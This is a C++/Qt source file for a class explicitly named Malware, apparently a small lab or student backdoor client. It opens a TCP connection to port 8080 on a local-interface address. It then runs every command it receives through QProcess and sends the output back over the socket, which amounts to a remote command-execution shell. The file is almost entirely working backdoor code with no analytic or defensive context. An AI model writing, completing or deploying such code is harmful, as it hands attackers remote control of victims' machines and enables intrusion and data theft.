#include "malware.h"
#include <QtDebug>
#include <QByteArray>
#include <QHostAddress>
#include <QStyle>
#include <QtNetwork>
#include <QProcess>

Malware::Malware()
{
    ConnectToServer();
   // QTimer *try_to_connect = new QTimer();
   // connect(try_to_connect, &QTimer::timeout, this, &My_Client::ConnectToServer);
   // try_to_connect->start(3000);
}

void Malware::execute() {
    // Implementation of the execute function
}

void Malware::ConnectToServer()
{
 // if(connection_state)
    //{
        //qDebug() << "try to connecting";
        client_Socket = new QTcpSocket();
        QString serverIP;

        QList<QHostAddress> ipAddressesList = QNetworkInterface::allAddresses();

        for (const QHostAddress &address : ipAddressesList) {
            if (address != QHostAddress::LocalHost && address != QHostAddress::LocalHostIPv6 &&
                address.protocol() == QAbstractSocket::IPv4Protocol)
            {
                serverIP = address.toString();
                break;
            }
        }
            client_Socket->connectToHost(serverIP, 8080);
            //if(client_Socket->state() == QTcpSocket::ConnectedState)
            //    connection_state = 0;

            connect(client_Socket, SIGNAL(readyRead()), this, SLOT(Read_Data()));
   // }
   // qDebug() << "connected.";
}

void Malware::Write_Data(QString out)
{
    qDebug() << "Write data";

    if (!out.isEmpty())
    {
        QByteArray requestData = out.toUtf8();
            client_Socket->write(requestData);
    }
}

void Malware::Read_Data()
{
    QByteArray data = client_Socket->readAll();
    qDebug() << "Read data : " + data;
    procces_the_command(data);
}

void Malware::procces_the_command(QString command) {
    QProcess proc;
    proc.start(command);
    proc.waitForFinished();
    QString output = proc.readAllStandardOutput();
    qDebug() << output;
    Write_Data(output);
}


